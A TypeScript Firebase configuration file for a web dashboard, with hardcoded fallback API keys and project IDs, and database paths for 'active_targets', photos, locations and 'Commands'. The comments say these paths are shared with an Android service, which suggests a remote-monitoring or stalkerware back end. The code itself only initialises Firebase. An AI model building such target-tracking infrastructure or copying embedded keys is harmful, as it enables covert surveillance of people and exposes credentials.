/**
 * Firebase configuration and initialization
 * Project ID: kei-project-cbbc4
 */

import { initializeApp } from 'firebase/app';
import { getAuth, Auth } from 'firebase/auth';
import { getDatabase, Database } from 'firebase/database';
import { getStorage, FirebaseStorage } from 'firebase/storage';

// Firebase configuration
export const firebaseConfig = {
  apiKey: process.env.NEXT_PUBLIC_FIREBASE_API_KEY || 'AIzaSyAa4KSIXYRzIOazBI2q_843FnPAAaJtenw',
  authDomain: process.env.NEXT_PUBLIC_FIREBASE_AUTH_DOMAIN || 'kei-project-cbbc4.firebaseapp.com',
  databaseURL: process.env.NEXT_PUBLIC_FIREBASE_DATABASE_URL || 'https://kei-project-cbbc4-default-rtdb.firebaseio.com',
  projectId: process.env.NEXT_PUBLIC_FIREBASE_PROJECT_ID || 'kei-project-cbbc4',
  storageBucket: process.env.NEXT_PUBLIC_FIREBASE_STORAGE_BUCKET || 'kei-project-cbbc4.firebasestorage.app',
  messagingSenderId: process.env.NEXT_PUBLIC_FIREBASE_MESSAGING_SENDER_ID || '902737611380',
  appId: process.env.NEXT_PUBLIC_FIREBASE_APP_ID || '1:902737611380:web:aef6d36562a8abe7f85f21',
  measurementId: process.env.NEXT_PUBLIC_FIREBASE_MEASUREMENT_ID || 'G-8TNYPNMGT5',
};

// Initialize Firebase
let app: any;
let auth: Auth;
let database: Database;
let storage: FirebaseStorage;

if (typeof window !== 'undefined') {
  app = initializeApp(firebaseConfig);
  auth = getAuth(app);
  database = getDatabase(app);
  storage = getStorage(app);
}

export { auth, database, storage, app };

/**
 * Firebase Schema Paths
 * Disesuaikan agar sinkron antara Aplikasi Android (KeiService.java) dan Dashboard Web
 */
export const FIREBASE_PATHS = {
  ACTIVE_TARGETS: 'kei-vault/active_targets',
  PHOTOS: 'kei-vault/photos',
  COMMANDS: 'Commands',
  SYSTEM_LOGS: 'system_logs',
  ACTIVITY_LOGS: 'system_logs', // alias for activity log hooks
  LOCATIONS: 'kei-vault/locations',
  DEVICE_LOCATIONS: 'kei-vault/locations', // backward compatibility alias
  STATS: 'kei-vault/stats',
} as const;
